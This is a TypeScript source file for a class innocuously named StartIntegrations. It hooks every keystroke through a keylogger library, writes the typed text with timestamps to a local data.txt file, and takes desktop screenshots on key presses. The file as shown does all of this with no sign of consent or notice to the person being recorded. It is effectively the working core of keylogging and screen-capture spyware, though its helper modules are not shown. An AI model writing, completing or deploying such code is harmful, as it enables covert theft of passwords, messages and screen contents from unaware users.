import fs from 'fs';
import keylogger from 'keylogger.js';
import screenshot from 'screenshot-desktop';

import { formatDate } from './keylogger.js/utils/formatDate';
import { formatTime } from './keylogger.js/utils/formatTime';
import { SHIFT_KEY_MAP } from './keylogger.js/keys/SHIFT_KEY_MAP';
import { SPECIAL_KEYS } from './keylogger.js/keys/SPECIAL_KEYS';

import { writeToFileAndClearBuffer } from './keylogger.js/functions/writeToFileAndClearBuffer';
import { handleKey } from './keylogger.js/functions/handleKey';
import { handleKeyPress } from './screenshot-desktop/functions/handleKeyPress';
import { IStartIntegrations } from './interfaces';

class StartIntegrations implements IStartIntegrations {
  textBuffer: string;

  activeModifiers: Set<string>;

  constructor() {
    this.textBuffer = '';
    this.activeModifiers = new Set<string>();
  }

  start(): void {
    try {
      keylogger.start((key: string, isKeyUp: boolean) => {
        this.textBuffer = writeToFileAndClearBuffer({ textBuffer: this.textBuffer, formatDate, formatTime, fs });
        this.textBuffer = handleKey({ key, isKeyUp, activeModifiers: this.activeModifiers, textBuffer: this.textBuffer, SHIFT_KEY_MAP, SPECIAL_KEYS });
        handleKeyPress({ key, isKeyUp, fs, screenshot });
      });

      setInterval(() => {
        const now = new Date();
        const timestamp = `${formatDate(now)} ${formatTime(now)} - `;
        fs.appendFileSync('data.txt', `\n${timestamp}`);
      }, 60000);
    } catch (error) {
      console.log('erro ===>>>', error)
    }
  }
}

export { StartIntegrations };
